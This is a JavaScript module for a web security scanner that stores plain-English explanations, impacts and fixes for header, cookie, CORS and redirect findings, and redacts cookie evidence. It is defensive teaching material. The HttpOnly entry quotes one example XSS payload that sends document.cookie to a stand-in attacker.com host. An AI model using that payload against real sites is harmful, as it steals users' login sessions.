import { config } from '../config/env.js';

/**
 * Expert Security Explainer Service
 * Provides educational, beginner-friendly explanations of security findings.
 * Designed with a comprehensive built-in knowledge base that works 100% offline
 * without any paid AI API key, plus optional fallback/LLM integration when
 * AI_API_KEY is configured.
 */

const RULE_KNOWLEDGE_BASE = {
  'SEC-HDR-CSP-MISSING': {
    explanation: 'Content Security Policy (CSP) acts like a strict security guard at the browser door. It tells the browser exactly which domains are allowed to run JavaScript, load CSS styles, or display images on your site. Without this guard, if an attacker finds any way to slip malicious JavaScript into your webpage, the browser will run it without question.',
    practicalImpact: 'If an attacker finds an input field that is not properly sanitized, they could steal sensitive user cookies, redirect visitors to phishing sites, or alter the content displayed on your page without your knowledge.',
    suggestedFix: "Add a Content-Security-Policy HTTP header to your web server or reverse proxy. A great starting policy for modern apps is: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'self';"
  },
  'SEC-HDR-HSTS-MISSING': {
    explanation: 'HSTS (HTTP Strict Transport Security) tells the web browser: "Never, under any circumstances, connect to this website over unencrypted HTTP. Always use HTTPS." When someone types your domain into a browser bar without "https://", the browser initially tries plain HTTP unless HSTS is remembered.',
    practicalImpact: 'On public Wi-Fi networks (like coffee shops or airports), an attacker can execute an SSL-stripping attack, intercepting the initial HTTP connection and stealing passwords or session cookies before the secure redirect ever happens.',
    suggestedFix: 'Configure your web server to return: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Ensure that your entire domain and all subdomains cleanly support HTTPS first.'
  },
  'SEC-HDR-XCTO-MISSING': {
    explanation: 'Web browsers sometimes try to be "helpful" by guessing what type of file they downloaded, even if the server declared something else (a behavior called MIME-sniffing). X-Content-Type-Options: nosniff forces the browser to strictly obey the Content-Type specified by your server.',
    practicalImpact: 'If a user uploads an image containing embedded malicious JavaScript, a browser without this header might decide to execute the image as a script, leading to stored XSS attacks.',
    suggestedFix: 'Set X-Content-Type-Options: nosniff on all responses. In Node/Express, you can easily enable this via helmet().'
  },
  'SEC-HDR-CLICKJACKING-DEFENSE-MISSING': {
    explanation: 'Clickjacking is an attack where an attacker puts your website inside a transparent iframe on their evil website. The victim thinks they are playing a game or clicking a harmless button, but their clicks are secretly passing through to invisible buttons on your site (like "Transfer Funds" or "Delete Account").',
    practicalImpact: 'An attacker can trick authenticated visitors into performing irreversible actions on your site without their consent.',
    suggestedFix: "Set X-Frame-Options: SAMEORIGIN (or DENY if your site never needs to be embedded) and CSP: frame-ancestors 'self'."
  },
  'COOKIE-MISSING-SECURE': {
    explanation: 'The Secure cookie flag instructs the browser that this cookie must only be sent across encrypted HTTPS connections. If an unencrypted HTTP link is loaded, the browser will refuse to transmit the cookie.',
    practicalImpact: 'Without the Secure flag, if a user clicks a regular http:// link or is tricked onto an HTTP asset, their authentication cookie will be broadcast across the open network in cleartext.',
    suggestedFix: 'In your session configuration (e.g. express-session or cookie-parser), set secure: true (or secure: process.env.NODE_ENV === "production").'
  },
  'COOKIE-MISSING-HTTPONLY': {
    explanation: 'The HttpOnly flag blocks client-side JavaScript (like document.cookie) from accessing the cookie. It ensures that only the web browser and the server can exchange the cookie during HTTP requests.',
    practicalImpact: 'If your application ever suffers from a Cross-Site Scripting (XSS) bug, having HttpOnly prevents the attacker from simply running `fetch("https://attacker.com/steal?c=" + document.cookie)` to steal active login sessions.',
    suggestedFix: 'Configure your cookie middleware with httpOnly: true.'
  },
  'CORS-ARBITRARY-ORIGIN-REFLECTED-CREDENTIALS': {
    explanation: 'CORS (Cross-Origin Resource Sharing) protects users from cross-site data theft. This finding means your server takes any Origin header sent by a browser, echoes it back as trusted, and allows credentials (cookies).',
    practicalImpact: 'An attacker can create malicious-site.com, invite your logged-in users to visit, and secretly make requests to your API. The attacker can read all private user records because the browser sends your cookies and your server permits it.',
    suggestedFix: 'Replace dynamic reflection with a hardcoded whitelist of allowed domains (e.g. your front-end domain and staging environment).'
  },
  'REDIRECT-HTTP-TO-HTTPS-MISSING': {
    explanation: 'When visitors type your domain or follow an unencrypted link, they enter via port 80 (HTTP). If you do not immediately redirect them to HTTPS (port 443), they browse your application without encryption.',
    practicalImpact: 'Anyone on the same local network or internet routing path can eavesdrop on all data sent between the user and your server.',
    suggestedFix: 'Add a 301 Permanent Redirect on port 80 that redirects all requests to https://$host$request_uri.'
  }
};

/**
 * Explains a finding in plain English with actionable next steps.
 * Sanitizes input and evidence, redacting sensitive tokens or cookies.
 */
export async function generateFindingExplanation(finding) {
  // Redact any possible sensitive attributes in evidence
  const sanitizedEvidence = { ...finding.evidence };
  if (sanitizedEvidence.cookieHeader) {
    sanitizedEvidence.cookieHeader = '[REDACTED_COOKIE_VALUE]';
  }

  // 1. Check built-in rule knowledge base
  const builtIn = RULE_KNOWLEDGE_BASE[finding.ruleId];
  if (builtIn) {
    return {
      source: 'expert_knowledge_engine',
      explanation: builtIn.explanation,
      practicalImpact: builtIn.practicalImpact,
      suggestedFix: builtIn.suggestedFix,
      generatedAt: new Date()
    };
  }

  // 2. Dynamic synthesis for rules without static templates
  return {
    source: 'expert_knowledge_engine',
    explanation: `${finding.title}: ${finding.description}`,
    practicalImpact: finding.impact || 'Misconfigurations of this type weaken the defense-in-depth posture of your web application.',
    suggestedFix: finding.remediation?.summary || 'Review recommended security practices for this rule and apply secure headers or configuration.',
    generatedAt: new Date()
  };
}
